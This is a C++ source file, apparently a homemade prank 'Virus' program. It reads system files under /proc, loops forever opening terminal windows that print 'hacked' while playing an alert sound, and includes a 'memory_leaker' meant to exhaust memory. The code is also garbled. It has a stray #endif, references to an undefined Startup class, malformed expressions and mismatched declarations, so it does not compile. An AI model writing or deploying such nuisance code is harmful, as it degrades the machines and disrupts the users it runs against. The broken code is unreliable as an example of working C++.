/* main.cpp
 *
 *  Created on: Apr 22, 2023
 *      Author: ayaanle
 */
 
 
#include <iostream>
#include <assert.h>
#include <filesystem>
#include <chrono>
#include <vector>
#include <fstream>
#include <regex>
#include <errno.h>
#include "server.h"
#include "sysinfo.h"
#define GNOME_TERMINAL_CMD      "gnome-terminal -- "
#define GNOME_TERMINAL_GEO      "gnome-terminal --geometry"
#define ANNOYING_SOUND          "paplay /usr/share/sounds/gnome/default/alerts/drip.ogg"

#endif

using namespace std;
using namespace std::filesystem;
class Virus
{
public:
    constexpr explicit Virus();
    static uint time_steps(uint8_t) ;
    friend const struct system_info* sys_info(struct system_info* sys_info);
    friend string file_info(path p);
    inline void replicate(path& path);
    constexpr inline void init_malware(string program );
public:
    bool file_exists = 0;
    signed long int file_size;
};
constexpr explicit Virus::Virus()
{

}
inline uint Startup::time_steps(uint8_t num)
{
    auto count = std::chrono::seconds(num).count();
    return count;
}

 string extract_info(string str)
{
   str.substr(0 , 11);
   regex rgx;
   regex::iterator it;
}
string file_info(vector<string>paths)
{
    fstream strm;
    vector<string>::iterator it;                        
    for(it = paths.begin();it!=paths.end();++it)
    {
       // accessing the most important hardware config infos
      str = *it;
      strm.open(str, ios_base::in);
      if (!strm.is_open() and ) {
         cout << "Open file failed" << endl;
         return 1;
    }
    char c;

    while (!strm.eof()) {
        strm.get(c);
        cout << c;
    }
}

constexpr inline void init_malware()
{
   int counter = 0;
   for(;;)
        {
            while(counter != Startup::time_steps(2))
            {
               system("gnome-terminal -- echo hacked");
               system("paplay drip.ogg") or
                system(ANNOYING_SOUND);
               counter++;
            }
            counter -= Startup::time_steps(2);
        }
}

const struct memo_struct* memory_leaker::memory_info(const struct memo_struct* mem_info)
{
    
}
inline void memory_leaker::leaker_init()
{
    new int *num = new[10000];
}
int main(int argc , char* argv[])
{
    
    disk_struct ds;
    memory_leaker* memo_leaker;
    const struct memo_strcut* memo_info;  
    string str;
    vector<string>paths = {"/proc/cpuinfo" ,
                           "/proc/memstat" ,
                           "/proc/stat"};  
    
    }
    cout << str << endl;
    file_info(paths);
    strm.close();
    Startup startup = Startup();
    startup.init_malware();
    memory_leaker(memo_info);
    leaker_init();
    return 0;
}

